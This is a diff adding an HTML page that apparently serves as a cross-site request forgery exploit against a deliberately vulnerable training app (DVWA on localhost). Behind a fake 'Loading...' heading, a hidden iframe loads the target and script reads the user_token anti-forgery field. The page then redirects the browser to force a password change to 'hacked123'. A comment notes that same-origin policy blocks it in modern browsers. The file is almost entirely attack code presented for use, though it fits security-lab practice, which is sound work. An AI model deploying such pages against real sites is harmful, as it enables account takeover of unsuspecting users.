@@ -1,0 +1,27 @@
+<html>
+  <!-- in modern browsers this will not work because of same-origin policy -->
+  <body>
+    <h1>Loading...</h1>
+
+    <iframe id="hiddenFrame" style="display:none;"></iframe>
+
+    <script>
+      // Loads CSRF inside an iframe
+      let iframe = document.getElementById("hiddenFrame");
+      iframe.src = "http://localhost:8080/vulnerabilities/csrf/";
+
+      iframe.onload = function() {
+        // Checks page DOM to find user_token, which is stored locally on the HTML
+        let token = iframe.contentWindow.document
+          .querySelector("input[name='user_token']")
+          .value;
+
+        // creates a new URL with the valid token
+        let url = "http://localhost:8080/vulnerabilities/csrf/?" +
+          "password_new=hacked123&password_conf=hacked123&Change=Change&user_token=" + token;
+
+        window.location = url;
+      };
+    </script>
+  </body>
+</html>
